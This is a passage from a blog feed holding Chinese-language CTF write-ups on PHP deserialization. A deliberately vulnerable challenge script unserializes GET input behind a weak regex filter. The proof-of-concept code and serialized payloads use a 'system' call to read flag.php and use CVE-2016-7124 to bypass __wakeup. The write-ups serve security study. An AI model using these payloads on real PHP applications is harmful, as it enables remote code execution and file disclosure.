class="variable">$com</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;comm = <span class="variable">$com</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">secret</span>(<span class="string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>));</span><br><span class="line"><span class="comment">// O:6:&quot;secret&quot;:1:&#123;s:12:&quot; secret comm&quot;;s:23:&quot;system(&#x27;cat flag.php&#x27;);&quot;;&#125;</span></span><br><span class="line"><span class="comment">// O:6:&quot;secret&quot;:1:&#123;S:12:&quot;\00secret\00comm&quot;;s:23:&quot;system(&#x27;cat flag.php&#x27;);&quot;;&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:6:&quot;secret&quot;:1:&#123;S:12:&quot;\00secret\00comm&quot;;s:23:&quot;system(&#x27;cat flag.php&#x27;);&quot;;&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;serVuln6-私有属性反序列化&quot;&gt;&lt;a href=&quot;#serVuln6-私有属性反序列化&quot; class=&quot;headerlink&quot; title=&quot;serVuln6 私有属性反序列化&quot;&gt;&lt;/a&gt;serVuln6 私有属性反序列化&lt;/h1&gt;&lt;figure class</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
  </entry>
  
  <entry>
    <title>serVuln5 序列化格式过滤与CVE-2016-7124</title>
    <link href="http://example.com/2023/12/22/serVuln5/"/>
    <id>http://example.com/2023/12/22/serVuln5/</id>
    <published>2023-12-22T13:25:23.000Z</published>
    <updated>2023-12-23T04:42:30.275Z</updated>
    
    <content type="html"><![CDATA[<h1 id="serVuln5-序列化格式过滤与CVE-2016-7124"><a href="#serVuln5-序列化格式过滤与CVE-2016-7124" class="headerlink" title="serVuln5 序列化格式过滤与CVE-2016-7124"></a>serVuln5 序列化格式过滤与CVE-2016-7124</h1><p>CVE-2016-7124漏洞影响版本：PHP5 &lt; 5.6.25，PHP7 &lt; 7.0.10</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include_once</span>(<span class="variable language_">$this</span>-&gt;file);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;Sonder&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">show_source</span>(<span class="string">&#x27;index.php&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Are you daydreaming?&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//sercet in flag.php</span></span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="variable">$file</span>;</span><br><span class="line"><span class="comment">//        echo $flag;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$Secret</span>=<span class="keyword">new</span> <span class="title function_ invoke__">secret</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="comment">//echo serialize($Secret),&quot;\n&quot;;//O:6:&quot;secret&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">urlencode</span>(<span class="string">&#x27;O:+6:&quot;secret&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A%2B6%3A%22secret%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;serVuln5-序列化格式过滤与CVE-2016-7124&quot;&gt;&lt;a href=&quot;#serVuln5-序列化格式过滤与CVE-2016-7124&quot; class=&quot;headerlink&quot; title=&quot;serVuln5 序列化格式过滤与CVE-2016-7124&quot;&gt;</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
  </entry>
  
</feed>
